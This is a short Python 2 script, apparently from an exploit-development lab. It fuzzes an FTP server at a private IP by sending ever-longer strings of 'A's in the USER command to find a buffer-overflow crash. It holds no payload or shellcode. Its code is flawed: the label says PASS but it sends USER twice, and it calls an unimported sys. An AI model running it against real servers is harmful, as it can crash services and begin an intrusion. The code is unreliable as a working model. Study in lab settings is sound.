#!/usr/bin/python

import socket, time

remoteip="192.168.15.150"

size=0
while True:

    string = "A"*size

    print "Fuzzing PASS with %s bytes" % len(string)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((remoteip, 21))
    except:
        print ("[-] Connection error!")
        sys.exit(1)

    print s.recv(1024)
    print "Sending username..."
    s.send('USER ' + string + '\r\n')
    print s.recv(1024)
    print "Sending pass..."
    s.send('USER LiveOverflow\r\n')
    print s.recv(1024)
    s.close()

    time.sleep(1)

    size += 100
    print ""

